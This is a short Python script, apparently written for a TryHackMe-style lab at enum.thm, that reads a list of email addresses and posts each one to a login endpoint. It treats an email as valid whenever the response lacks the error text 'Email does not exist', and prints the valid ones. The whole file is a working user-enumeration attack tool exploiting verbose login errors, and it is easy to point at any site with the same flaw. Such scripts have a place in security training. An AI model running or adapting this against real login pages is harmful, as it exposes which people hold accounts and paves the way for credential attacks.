import sys
import requests

def enum_mail(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'default', #Any pass is fine
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def valid_check(emailFile):
    valid_emails = []
    # Error message for invalid emails. YOU NEED TO EDIT THIS!
    msg = "Email does not exist"
    
    with open(emailFile, "r") as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()
        if email:
            # Compare the response json of default error with the email in use
            response_json = enum_mail(email)
            if response_json['status'] == 'error' and msg in response_json['message']:
                # print('INVALID:', email) #Uncomment this line and the print line below if you want more verbose
                continue
            else:
                # print('VALID:', email)
                valid_emails.append(email) #Add the valid email to this valid list

    return valid_emails


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 emailEnum.py <email_list>")
        sys.exit(1)

email_file = sys.argv[1]

valid_emails = valid_check(email_file)

print("VALID EMAILS FOUND: ", len(valid_emails))
for valid_email in valid_emails:
    print(valid_email)

